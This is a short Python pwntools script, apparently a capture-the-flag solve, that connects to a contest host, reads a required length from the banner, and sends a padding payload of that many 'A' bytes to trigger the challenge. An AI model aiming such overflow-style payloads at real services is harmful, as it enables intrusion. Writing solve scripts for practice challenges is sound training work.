#!/usr/bin/env python3
from pwn import remote
import re


HOST = "tnkemaq46125.boroctf.com"
PORT = 56354


def main() -> None:
    io = remote(HOST, PORT)

    line = io.recvline().decode("latin1").strip()
    print(f"[+] banner: {line}")

    match = re.search(r"0x([0-9a-fA-F]+)", line)
    if not match:
        raise RuntimeError("failed to parse required length from banner")

    length = int(match.group(1), 16)
    payload = b"A" * length
    io.sendline(payload)

    response = io.recvall(timeout=2).decode("latin1", "replace")
    print(response, end="")
    io.close()


if __name__ == "__main__":
    main()
